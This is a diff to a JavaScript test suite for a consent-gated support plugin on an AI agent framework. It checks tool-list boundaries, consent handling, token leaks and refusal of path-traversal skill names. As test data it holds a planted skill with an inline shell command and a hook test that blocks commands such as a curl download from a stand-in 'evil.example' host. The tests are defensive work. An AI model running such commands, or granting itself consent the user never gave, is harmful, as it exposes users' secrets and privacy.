@@ -72,6 +72,30 @@ print(tools[sys.argv[2]]["handler"](json.loads(sys.argv[3])))
     else reject(Object.assign(new Error(stderr || stdout || 'plugin call failed'), { status, stdout, stderr }));
   });
 });
+const pluginHook = (pluginPath, message, env) => new Promise((resolve, reject) => {
+  const child = spawn(pluginPy(), ['-c', `
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("tess_visit_hook", sys.argv[1])
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+mod.pre_llm_call(user_message=sys.argv[2])
+print("hooked")
+`, pluginPath, message], { env, stdio: ['ignore', 'pipe', 'pipe'] });
+  let stdout = '';
+  let stderr = '';
+  const timer = setTimeout(() => {
+    child.kill('SIGKILL');
+    reject(new Error('plugin hook timed out'));
+  }, 20000);
+  child.stdout.on('data', (chunk) => { stdout += chunk; });
+  child.stderr.on('data', (chunk) => { stderr += chunk; });
+  child.on('error', (err) => { clearTimeout(timer); reject(err); });
+  child.on('exit', (status) => {
+    clearTimeout(timer);
+    if (status === 0) resolve(stdout);
+    else reject(Object.assign(new Error(stderr || stdout || 'plugin hook failed'), { status, stdout, stderr }));
+  });
+});
 
 const yamlItems = (text, header) => {
   const lines = text.split('\n');
@@ -193,7 +217,7 @@ try {
     'cronjob', 'video', 'video_gen', 'image_gen', 'tts', 'memory', 'todo',
     'session_search', 'vision', 'web', 'connections', 'catalog', 'project',
     'desktop_ui', 'discord', 'discord_admin', 'yuanbao', 'kanban', 'x_search',
-    'feishu_doc', 'feishu_drive', 'onboarding',
+    'feishu_doc', 'feishu_drive', 'onboarding', 'skills',
   ];
   assert.match(shipped, /inline_shell:\s*false/);
   assert.match(shipped, /tool_search:\n {4}enabled:\s*"off"/);
@@ -201,13 +225,16 @@ try {
   for (const name of off) assert.ok(disabled.includes(name), `${name} is still enabled`);
   assert.deepEqual(yamlItems(cfg, '  disabled_toolsets:'), disabled);
   const hermesSrc = process.env.HERMES_AGENT_SRC || '/tmp/hermes-agent';
-  const hermesPy = existsSync('/tmp/hermes-venv/bin/python') ? '/tmp/hermes-venv/bin/python' : 'python3';
+  const hermesPy = process.env.TESS_HERMES_PYTHON
+    || (existsSync('/tmp/tess-hermes-test/venv/bin/python') ? '/tmp/tess-hermes-test/venv/bin/python' : 'python3');
   const pluginFile = join(root, 'support/mac/plugins/tess-visit/__init__.py');
   const hermesHomeForImport = join(box, 'hermes-import');
   mkdirSync(hermesHomeForImport, { recursive: true });
   writeFileSync(join(hermesHomeForImport, 'config.yaml'), shipped);
-  console.error('mac-test: hermes list starting');
-  const hermesList = spawnSync(hermesPy, ['-c', `
+  if (process.env.TESS_SKIP_HERMES === '1') {
+    console.error('\nSKIP: TESS_SKIP_HERMES=1 — the Hermes boundary check did not run.\n');
+  }
+  const hermesList = process.env.TESS_SKIP_HERMES === '1' ? null : spawnSync(hermesPy, ['-c', `
 import json, os, shutil, sys
 from pathlib import Path
 os.environ["HERMES_HOME"] = sys.argv[2]
@@ -218,8 +245,8 @@ try:
     from model_tools import get_tool_definitions
     from tools.registry import registry
 except Exception as exc:
-    print("SKIP: Hermes toolset resolution was not imported (%s: %s)." % (type(exc).__name__, exc))
-    raise SystemExit(0)
+    print("Hermes import failed: %s: %s" % (type(exc).__name__, exc), file=sys.stderr)
+    raise SystemExit(1)
 disabled = json.loads(sys.argv[3])
 def listed(**kw):
     defs = get_tool_definitions(disabled_toolsets=disabled, quiet_mode=True, **kw)
@@ -227,8 +254,8 @@ def listed(**kw):
 before = listed()
 registered = {entry.name for entry in registry._snapshot_entries()}
 if "terminal" not in registered:
-    print("SKIP: Hermes toolset resolution was not imported (terminal_tool did not register).")
-    raise SystemExit(0)
+    print("Hermes toolset resolution did not register terminal", file=sys.stderr)
+    raise SystemExit(1)
 home = Path(sys.argv[2])
 dest = home / "plugins" / "tess-visit"
 dest.mkdir(parents=True)
@@ -250,10 +277,8 @@ print(json.dumps({"before": before, "after": after, "raw": raw}))
     env: { PATH: process.env.PATH || '', HOME: hermesHomeForImport, LANG: 'C', PYTHONDONTWRITEBYTECODE: '1' },
   });
   console.error('mac-test: hermes list returned');
-  const hermesText = `${hermesList.stdout || ''}${hermesList.stderr || ''}`;
-  if (hermesText.includes('SKIP:')) {
-    console.error(`\n${hermesText.trim()}\nThe Mac tool-list check did not run.\n`);
-  } else {
+  if (hermesList) {
+    const hermesText = `${hermesList.stdout || ''}${hermesList.stderr || ''}`;
     if (hermesList.status !== 0) throw new Error(hermesText || 'hermes tool list failed');
     const listed = JSON.parse(hermesList.stdout.trim().split('\n').filter(Boolean).pop());
     const forbidden = [
@@ -261,25 +286,18 @@ print(json.dumps({"before": before, "after": after, "raw": raw}))
       'execute_code', 'delegate_task', 'cronjob_manage', 'computer_use', 'browser_exec',
       'image_generate', 'video_generate', 'video_analyze', 'text_to_speech', 'memory', 'todo_list',
       'manage_catalog', 'desktop_project', 'feishu_drive_add_comment', 'feishu_drive_reply_comment',
-      'setup_beat',
+      'setup_beat', 'skills_list', 'skill_view', 'skill_manage', 'tess_consent',
     ];
     for (const name of forbidden) {
       assert.equal(listed.before.includes(name), false, `${name} is on the model's tool list`);
+      assert.equal(listed.after.includes(name), false, `${name} came back after the plugin loaded`);
+      assert.equal(listed.raw.includes(name), false, `${name} is in the catalog the bridge can call`);
     }
-    // skill_manage is glued to skill_view. The real plugin load hides it. A direct
-    // deregister is not what Hermes allows a profile plugin to do.
-    assert.equal(listed.before.includes('skill_manage'), true, 'skill_manage was not loaded, so the drop was not tested');
-    assert.equal(listed.after.includes('skill_manage'), false, 'skill_manage is still on the model tool list');
-    assert.equal(listed.raw.includes('skill_manage'), false, 'skill_manage is still in the tool-search catalog');
-    for (const name of ['skills_list', 'skill_view', 'clarify', 'tess_visit_start', 'tess_doctor', 'tess_consent', 'tess_still', 'tess_post', 'tess_handoff']) {
+    for (const name of ['clarify', 'tess_visit_start', 'tess_doctor', 'tess_guard_log', 'tess_ask_consent', 'tess_still', 'tess_read_skill', 'tess_save_note', 'tess_open_issues', 'tess_triage', 'tess_post', 'tess_handoff']) {
       assert.equal(listed.after.includes(name), true, `${name} was removed from the model tool list`);
     }
     for (const name of ['tool_search', 'tool_describe', 'tool_call']) {
       assert.equal(listed.after.includes(name), false, `${name} is on the model's tool list`);
-    }
-    for (const name of forbidden) {
-      assert.equal(listed.after.includes(name), false, `${name} came back after the plugin loaded`);
-      assert.equal(listed.raw.includes(name), false, `${name} is in the catalog the bridge can call`);
     }
   }
 
@@ -301,6 +319,10 @@ print(json.dumps({"before": before, "after": after, "raw": raw}))
   assert.match(readFileSync(join(profile, 'skills/tess-gather/SKILL.md'), 'utf8'), /kind` `doctor`/);
   assert.match(readFileSync(join(profile, 'skills/tess-handoff/SKILL.md'), 'utf8'), /`theme`, `mini`, or `installer`/);
   assert.match(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /tess_visit_start/);
+  assert.match(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /tess_ask_consent/);
+  assert.match(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /tess_read_skill/);
+  assert.doesNotMatch(readFileSync(join(root, 'support/mac/skills/tess-evidence/SKILL.md'), 'utf8'), /tess_consent/);
+  assert.doesNotMatch(readFileSync(join(root, 'support/mac/plugins/tess-visit/__init__.py'), 'utf8'), /def consent\(/);
   assert.doesNotMatch(readFileSync(join(profile, 'skills/tess-support/SKILL.md'), 'utf8'), /node \$HERMES_HOME/);
   assert.match(cfg, /tess-visit/);
   assert.ok(existsSync(join(profile, 'plugins/tess-visit/__init__.py')));
@@ -483,60 +505,160 @@ print(json.dumps({"before": before, "after": after, "raw": raw}))
     TESS_SUPPORT_TOKEN: token,
     TESS_INBOX: `http://127.0.0.1:${visitPort}`,
   };
-  // skill_view can run !`cmd` from a skill file when inline_shell is on. The profile turns it off.
-  // Reading the skills, including a planted one, must not print the token or create a file.
+  // A planted skill with a shell snippet and a dependency. The model must not be able to open it.
   const inlineMarker = join(box, 'tess-inline-shell');
   const probeSkill = join(visitProfile, 'skills', 'tess-inline-probe');
   mkdirSync(probeSkill);
   writeFileSync(join(probeSkill, 'SKILL.md'), `---
 name: tess-inline-probe
 description: "Probe skill. Not part of the visit."
+deps: ["definitely-not-a-real-package"]
 ---
 
 !\`touch ${inlineMarker}\`
 `);
-  console.error('mac-test: skill_view starting');
-  const skillSaw = spawnSync(hermesPy, ['-c', `
-import os, sys
+  if (process.env.TESS_SKIP_HERMES !== '1') {
+    console.error('mac-test: hermes dispatch starting');
+    const boundary = spawnSync(hermesPy, ['-c', `
+import json, os, sys
 os.environ["HERMES_HOME"] = sys.argv[1]
 os.environ["HOME"] = sys.argv[2]
 sys.path.insert(0, sys.argv[3])
 token, marker = sys.argv[4], sys.argv[5]
 try:
-    from tools.skills_tool import skill_view, skills_list
+    import tools.terminal_tool
+    from model_tools import get_tool_definitions
+    from tools.registry import registry
+    from hermes_cli.plugins import get_plugin_manager
 except Exception as exc:
-    print("SKIP: skill_view was not imported (%s: %s)." % (type(exc).__name__, exc))
-    raise SystemExit(0)
-view = skill_view("tess-inline-probe")
-if marker not in view:
-    print("the probe skill was not shown to the model")
+    print("Hermes import failed: %s: %s" % (type(exc).__name__, exc), file=sys.stderr)
     raise SystemExit(1)
-parts = [skills_list(), view]
+mgr = get_plugin_manager()
+mgr.discover_and_load(force=True)
+loaded = mgr._plugins.get("tess-visit")
+if loaded is None or not getattr(loaded, "enabled", False):
+    print("plugin load failed: %s" % (getattr(loaded, "error", None) or "missing"), file=sys.stderr)
+    raise SystemExit(1)
+defs = get_tool_definitions(disabled_toolsets=json.loads(sys.argv[6]), quiet_mode=True)
+names = sorted({t["function"]["name"] for t in defs})
+for banned in ("skills_list", "skill_view", "skill_manage", "tess_consent", "terminal"):
+    if banned in names:
+        print("tool still offered: %s" % banned, file=sys.stderr)
+        raise SystemExit(1)
+for needed in ("clarify", "tess_ask_consent", "tess_still", "tess_read_skill", "tess_visit_start"):
+    if needed not in names:
+        print("missing tool: %s in %s" % (needed, names), file=sys.stderr)
+        raise SystemExit(1)
+
+def run(name, args):
+    return registry.dispatch(name, args or {})
+
+def state():
+    visit = loaded.module
+    try:
+        session = visit.current_session()
+    except ValueError:
+        return "", None
+    path = session / "consent.txt"
+    if not path.is_file():
+        return "", session
+    return path.read_text(encoding="utf-8"), session
+
+def fail(msg):
+    print(msg, file=sys.stderr)
+    raise SystemExit(1)
+
+start = json.loads(run("tess_visit_start", {}))
+if not start.get("ok"):
+    fail("visit_start failed: %s" % start)
+mgr.invoke_hook("pre_llm_call", user_message="yes")
+early = json.loads(run("tess_still", {}))
+if early.get("ok") or "Ask first" not in early.get("error", ""):
+    fail("a yes before the question counted: %s" % early)
+if state()[0] == "yes\\n":
+    fail("consent was yes before the question")
+unknown = run("tess_consent", {"yes": True})
+if "Unknown tool" not in unknown:
+    fail("tess_consent is still callable: %s" % unknown)
+for name, args in (
+    ("tess_ask_consent", {"yes": True}),
+    ("tess_save_note", {"kind": "words", "text": "yes"}),
+    ("tess_doctor", {"yes": True}),
+    ("tess_read_skill", {"name": "tess-support"}),
+    ("tess_still", {}),
+):
+    run(name, args)
+if state()[0] == "yes\\n":
+    fail("a tool call granted consent")
+asked = json.loads(run("tess_ask_consent", {}))
+question = "May I take one still of the Spotify window? It can show your Spotify name, your picture, your friends' activity, and your playlist names."
+if asked.get("question") != question:
+    fail("question mismatch: %s" % asked)
+if state()[0] != "asked\\n":
+    fail("ask did not record the question: %r" % (state()[0],))
+if json.loads(run("tess_still", {})).get("ok"):
+    fail("still ran before the reply")
+
+def reply(phrase):
+    text, session = state()
+    consent = session / "consent.txt"
+    if consent.is_file():
+        consent.unlink()
+    run("tess_ask_consent", {})
+    mgr.invoke_hook("pre_llm_call", user_message=phrase)
+    return state()[0]
+
+for phrase in ("yes please", "yeah", "no", ""):
+    got = reply(phrase)
+    if got != "no\\n":
+        fail("not a no: %r -> %r" % (phrase, got))
+    if json.loads(run("tess_still", {})).get("ok"):
+        fail("still ran after %r" % phrase)
+for phrase in ("yes", "YES", "  y. ", "ok", "OK!", "sure", "go ahead", "Go ahead."):
+    got = reply(phrase)
+    if got != "yes\\n":
+        fail("not a yes: %r -> %r" % (phrase, got))
+shot = json.loads(run("tess_still", {}))
+if not shot.get("ok"):
+    fail("a yes did not allow the still: %s" % shot)
+again = json.loads(run("tess_visit_start", {}))
+if not again.get("ok"):
+    fail("second visit failed: %s" % again)
+mgr.invoke_hook("pre_llm_call", user_message="yes")
+if state()[0] == "yes\\n" or json.loads(run("tess_still", {})).get("ok"):
+    fail("a previous visit's yes counted")
+if os.path.exists(marker):
+    fail("marker existed before the skill read")
 for name in ("tess-support", "tess-gather", "tess-evidence", "tess-handoff"):
-    parts.append(skill_view(name))
-parts.append(skill_view("tess-support", file_path="../.env"))
-parts.append(skill_view("tess-support", file_path=".env"))
-text = "\\n".join(str(part) for part in parts)
-print("LEAK" if token and token in text else "clean")
-`, visitProfile, visitEnv.HOME, hermesSrc, token, inlineMarker], {
-    encoding: 'utf8',
-    env: {
-      PATH: process.env.PATH || '',
-      HOME: visitEnv.HOME,
-      HERMES_HOME: visitProfile,
-      LANG: 'C',
-      PYTHONDONTWRITEBYTECODE: '1',
-    },
-  });
-  console.error('mac-test: skill_view returned', skillSaw.status);
-  const skillText = `${skillSaw.stdout || ''}${skillSaw.stderr || ''}`;
-  if (skillText.includes('SKIP:')) {
-    console.error(`\n${skillText.trim()}\nThe skill_view check did not run.\n`);
-  } else {
-    if (skillSaw.status !== 0) throw new Error(skillText || 'skill_view check failed');
-    assert.match(skillSaw.stdout, /clean\n$/);
-    assert.equal(existsSync(inlineMarker), false, 'skill_view ran an inline shell');
-    assert.ok(!skillText.includes(token), 'skill_view printed the token');
+    got = json.loads(run("tess_read_skill", {"name": name}))
+    if not got.get("ok") or "name: " + name not in got.get("skill", ""):
+        fail("skill missing: %s %s" % (name, got))
+    if token and token in json.dumps(got):
+        fail("skill read leaked the token")
+for name in ("tess-inline-probe", "../.env", "tess-support/../../.env", "other"):
+    got = json.loads(run("tess_read_skill", {"name": name}))
+    if got.get("ok"):
+        fail("skill name accepted: %s" % name)
+    if token and token in json.dumps(got):
+        fail("refused skill leaked the token")
+refused = run("skill_view", {"name": "tess-inline-probe"})
+if "Unknown tool" not in refused and "cannot use that skill tool" not in refused:
+    fail("skill_view still runs: %s" % refused[:300])
+run("skills_list", {})
+if os.path.exists(marker):
+    fail("a skill tool ran a command")
+print("boundary-ok")
+`, visitProfile, visitEnv.HOME, hermesSrc, token, inlineMarker, JSON.stringify(disabled)], {
+      encoding: 'utf8',
+      timeout: 120000,
+      env: { ...visitEnv, PYTHONDONTWRITEBYTECODE: '1' },
+    });
+    console.error('mac-test: hermes dispatch returned', boundary.status);
+    const boundaryText = `${boundary.stdout || ''}${boundary.stderr || ''}`;
+    if (boundary.status !== 0) throw new Error(boundaryText || 'hermes dispatch failed');
+    assert.match(boundary.stdout, /boundary-ok\n$/);
+    assert.equal(existsSync(inlineMarker), false, 'a skill tool ran a command');
+    assert.ok(!boundaryText.includes(token), 'the Hermes dispatch printed the token');
   }
   const sessionScript = join(visitProfile, 'skills/tess-support/scripts/session.mjs');
   const session = run(sessionScript, ['new'], visitEnv).trim();
@@ -598,6 +720,9 @@ print(json.dumps({name: sorted(props) for name, props in tools.items()}))
   for (const [name, keys] of Object.entries(schemas)) {
     for (const key of keys) assert.equal(bannedKeys.includes(key), false, `${name} takes ${key}`);
   }
+  assert.equal(schemas.tess_consent, undefined);
+  assert.deepEqual(schemas.tess_ask_consent, []);
+  assert.deepEqual(schemas.tess_read_skill, ['name']);
   const call = async (name, params, env = visitEnv) => {
     const raw = await pluginCall(pluginPath, name, params, env);
     assert.ok(!raw.includes(token), `${name} printed the token`);
@@ -608,7 +733,8 @@ print(json.dumps({name: sorted(props) for name, props in tools.items()}))
   delete noNode.TESS_NODE;
   const missingNode = await call('tess_visit_start', {}, noNode);
   assert.equal(missingNode.ok, false);
-  assert.match(missingNode.error, /no Node runtime/);
+  // No Node means the privacy filter cannot run, so the reply is withheld rather than the raw error.
+  assert.equal(missingNode.error, '(output withheld: the privacy filter did not run)');
   const bundleHome = join(box, 'bundle-node');
   mkdirSync(join(bundleHome, 'runtime/node/bin'), { recursive: true });
   const bundleNode = join(bundleHome, 'runtime/node/bin/node');
@@ -682,6 +808,7 @@ if [ -f "$HERMES_HOME/.env" ]; then cat "$HERMES_HOME/.env"; fi
   assert.equal((await call('tess_visit_start', {})).ok, true);
   const visitId = readFileSync(join(visitProfile, 'cache/support/current-session'), 'utf8').trim();
   const toolSession = join(visitProfile, 'cache/support/sessions', visitId);
+  await pluginHook(pluginPath, 'yes', visitEnv);
   const earlyStill = await call('tess_still', {});
   assert.equal(earlyStill.ok, false);
   assert.match(earlyStill.error, /Ask first/);
@@ -692,6 +819,39 @@ if [ -f "$HERMES_HOME/.env" ]; then cat "$HERMES_HOME/.env"; fi
   assert.doesNotMatch(doctorOut.doctor, /ada@example\.com/);
   assert.ok(!doctorOut.doctor.includes(token), 'the doctor text returned the token');
   assert.doesNotMatch(doctorOut.doctor, /TOKEN_IN_ENV/, 'the doctor process was given the support token');
+  const withheld = '(output withheld: the privacy filter did not run)';
+  const scrubDir = join(box, 'scrub');
+  mkdirSync(scrubDir);
+  writeFileSync(join(scrubDir, 'fail.mjs'), 'process.exit(1)\n');
+  writeFileSync(join(scrubDir, 'slow.mjs'), 'setTimeout(() => {}, 60000)\n');
+  const scrubbed = execFileSync(pluginPy(), ['-c', `
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("tess_visit_scrub", sys.argv[1])
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+node, secret, fail, slow, real = sys.argv[2:]
+cases = {
+    "missing": mod.scrub_text(secret, "SECRETTOKEN", node, "/no/such/privacy.mjs"),
+    "empty": mod.scrub_text(secret, "SECRETTOKEN", "", ""),
+    "failed": mod.scrub_text(secret, "SECRETTOKEN", node, fail),
+    "timed": mod.scrub_text(secret, "SECRETTOKEN", node, slow),
+    "ok": mod.scrub_text(secret, "SECRETTOKEN", node, real),
+}
+for name, text in cases.items():
+    print(name + "\\t" + text.replace("\\n", " "))
+`, pluginFile, process.execPath, 'ada@example.com /Users/ada SECRETTOKEN', join(scrubDir, 'fail.mjs'), join(scrubDir, 'slow.mjs'), join(root, 'support/bot/skills/tess-support/scripts/privacy.mjs')], {
+    encoding: 'utf8',
+    timeout: 30000,
+    env: { PATH: process.env.PATH || '', HOME: visitEnv.HOME, LANG: 'C', PYTHONDONTWRITEBYTECODE: '1' },
+  });
+  const scrubLines = Object.fromEntries(scrubbed.trim().split('\n').map((line) => line.split('\t')));
+  for (const name of ['missing', 'empty', 'failed', 'timed']) {
+    assert.equal(scrubLines[name], withheld, name);
+  }
+  assert.doesNotMatch(scrubbed, /ada@example\.com/);
+  assert.doesNotMatch(scrubbed, /SECRETTOKEN/);
+  assert.notEqual(scrubLines.ok, withheld);
+  assert.doesNotMatch(scrubLines.ok, /ada@example\.com/);
   assert.equal((await call('tess_save_note', { kind: '../.env', text: 'no' })).ok, false);
   assert.equal((await call('tess_save_note', { kind: 'words', text: '' })).ok, false);
   assert.equal((await call('tess_save_note', { kind: 'words', text: 'x'.repeat(64 * 1024 + 1) })).ok, false);
@@ -702,10 +862,15 @@ if [ -f "$HERMES_HOME/.env" ]; then cat "$HERMES_HOME/.env"; fi
   assert.equal((await call('tess_save_note', { kind: 'title', text: 'Lyrics sit half a second behind the song' })).ok, true);
   assert.equal((await call('tess_save_note', { kind: 'summary', text: 'Spotify itself is missing, which is what they noticed.' })).ok, true);
   assert.equal(existsSync('/tmp/t'), false, 'a note ran curl');
-  assert.equal((await call('tess_consent', { yes: 'yes' })).ok, false, 'a string is not a yes');
-  assert.equal((await call('tess_consent', { yes: false })).ok, true);
+  assert.equal((await call('tess_ask_consent', { yes: true })).ok, false, 'a yes argument is not consent');
+  const asked = await call('tess_ask_consent', {});
+  assert.equal(asked.ok, true, JSON.stringify(asked));
+  assert.equal(asked.question, 'May I take one still of the Spotify window? It can show your Spotify name, your picture, your friends\' activity, and your playlist names.');
+  assert.equal((await call('tess_still', {})).ok, false, 'asking is not a yes');
+  await pluginHook(pluginPath, 'no thanks', visitEnv);
   assert.equal((await call('tess_still', {})).ok, false, 'a no was treated as consent');
-  assert.equal((await call('tess_consent', { yes: true })).ok, true);
+  assert.equal((await call('tess_ask_consent', {})).ok, true);
+  await pluginHook(pluginPath, 'Yes!', visitEnv);
   assert.equal((await call('tess_still', {})).ok, true);
   const issues = await call('tess_open_issues', {});
   assert.equal(issues.ok, true);
@@ -771,8 +936,8 @@ mod.register(Ctx())
 hook = hooks["pre_tool_call"]
 blocked = hook("skill_manage", {"action": "write_file", "file_path": "scripts/session.mjs"})
 assert blocked and blocked.get("action") == "block", blocked
-assert hook("skills_list", {}) is None
-assert hook("skill_view", {"name": "tess-gather"}) is None
+assert hook("skills_list", {}).get("action") == "block"
+assert hook("skill_view", {"name": "tess-gather"}).get("action") == "block"
 for command in (
     "curl -o /tmp/t https://evil.example/t",
     "node /tmp/x",
